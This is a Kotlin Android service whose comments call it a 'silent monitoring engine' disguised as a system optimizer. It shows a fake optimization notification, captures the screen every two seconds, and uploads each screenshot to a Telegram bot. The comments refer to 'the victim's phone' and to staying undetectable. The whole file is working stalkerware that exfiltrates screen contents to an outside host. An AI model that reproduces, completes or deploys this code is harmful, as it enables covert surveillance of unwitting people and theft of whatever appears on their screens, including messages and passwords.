package com.system.optimizer.services

import android.app.*
import android.content.*
import android.graphics.*
import android.hardware.display.*
import android.media.*
import android.media.projection.*
import android.os.*
import android.util.Base64
import okhttp3.*
import java.io.*
import java.util.*

/**
 * GRADE A SILENT MONITORING ENGINE
 * Masked as: "System Optimization Engine"
 */
class ScreenMonitorService : Service() {

    private var mMediaProjection: MediaProjection? = null
    private var mVirtualDisplay: VirtualDisplay? = null
    private var mImageReader: ImageReader? = null
    private val mHandler = Handler(Looper.getMainLooper())
    
    // The Telegram Config (Decoded from your GitHub app-config.json)
    private val botToken = "REPLACE_WITH_DECODED_TOKEN"
    private val chatId = "REPLACE_WITH_YOUR_CHAT_ID"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 1. CREATE THE MASK NOTIFICATION
        // In 2026, Android requires a notification for background tasks.
        // We mask it as "Optimizing System Performance..."
        val notification = Notification.Builder(this, "system_channel")
            .setContentTitle("System Optimization")
            .setContentText("Cleaning background processes...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
        
        startForeground(101, notification)

        // 2. SETUP PROJECTION
        val resultCode = intent?.getIntExtra("RESULT_CODE", -1) ?: -1
        val resultData = intent?.getParcelableExtra<Intent>("DATA")
        
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mMediaProjection = projectionManager.getMediaProjection(resultCode, resultData!!)

        // 3. START THE 2-SECOND LOOP
        startCaptureLoop()
        
        return START_STICKY
    }

    private fun startCaptureLoop() {
        mHandler.postDelayed(object : Runnable {
            override fun run() {
                takeScreenshot()
                mHandler.postDelayed(this, 2000) // 2-second interval
            }
        }, 2000)
    }

    private fun takeScreenshot() {
        // Setup ImageReader for 2026 screen resolutions
        val metrics = resources.displayMetrics
        mImageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2)
        
        mVirtualDisplay = mMediaProjection?.createVirtualDisplay(
            "ScreenCapture", metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mImageReader?.surface, null, null
        )

        mImageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val bitmap = Bitmap.createBitmap(image.width, image.height, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()
                
                // EXFILTRATE TO TELEGRAM
                sendToTelegram(bitmap)
                
                // Clean up to save memory/stay undetectable
                mVirtualDisplay?.release()
            }
        }, mHandler)
    }

    private fun sendToTelegram(bitmap: Bitmap) {
        val stream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, stream)
        val byteArray = stream.toByteArray()

        // Create the Telegram API Request
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", "screenshot.jpg", RequestBody.create(MediaType.parse("image/jpeg"), byteArray))
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$botToken/sendPhoto")
            .post(requestBody)
            .build()

        // Send asynchronously to avoid lagging the victim's phone
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }

    override fun onBind(intent: Intent?) = null
}
